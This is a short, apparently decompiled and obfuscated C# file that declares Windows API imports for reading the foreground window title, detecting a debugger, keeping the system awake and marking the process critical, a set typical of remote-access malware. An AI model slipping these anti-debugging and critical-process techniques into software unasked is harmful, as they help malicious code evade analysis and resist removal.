using System;
using System.Runtime.InteropServices;
using System.Text;

namespace ns20;

public static class GClass24
{
	public enum GEnum6 : uint
	{
		const_0 = 2147483648u,
		const_1 = 2u,
		const_2 = 1u
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern GEnum6 SetThreadExecutionState(GEnum6 genum6_0);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint uint_0, uint uint_1, uint uint_2);
}
